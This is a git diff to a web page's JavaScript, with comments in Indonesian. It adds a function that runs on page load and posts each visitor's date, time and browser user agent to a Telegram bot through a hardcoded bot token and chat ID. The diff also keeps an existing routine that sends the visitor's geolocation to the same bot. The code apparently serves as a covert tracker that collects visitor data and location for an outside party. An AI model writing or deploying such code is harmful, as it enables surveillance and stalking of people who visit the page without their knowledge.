@@ -5,6 +5,31 @@ var botToken = '7414756868:AAEoYeLOI3CXh8C-MKZoBDdJkiJjMQxfGPs';
 var chatId = '5450283191';
 
 
+function sendDateTimeAndUserAgentToTelegram(dateTime, userAgent) {
+    var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    var data = {
+        chat_id: chatId,
+        text: `Tanggal dan Waktu: ${dateTime}\nUser Agent: ${userAgent}`
+    };
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', telegramApiUrl, true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                console.log('Datetime and User Agent sent to Telegram');
+            } else {
+                console.error('Failed to send DateTime and User Agent to Telegram:', xhr.status);
+            }
+        }
+    };
+
+    xhr.send(JSON.stringify(data));
+}
+
+
 
 function sendLocationToTelegram(latitude, longitude, userAgent) {
     var telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
@@ -73,7 +98,22 @@ function askForLocationPermission() {
 }
 
 
+// document.addEventListener("DOMContentLoaded", function () {
+//     getLocationAndSend();
+// });
+
 document.addEventListener("DOMContentLoaded", function () {
+    // Mendapatkan tanggal dan waktu saat ini
+    var currentDateTime = new Date().toLocaleString();
+
+    // Mendapatkan user agent saat ini
+    var userAgent = navigator.userAgent;
+
+    // Mengirim tanggal, waktu, dan user agent saat halaman dimuat
+    sendDateTimeAndUserAgentToTelegram(currentDateTime, userAgent);
+
+    // Memulai proses mendapatkan lokasi dan mengirimnya ke Telegram
     getLocationAndSend();
 });
+
 
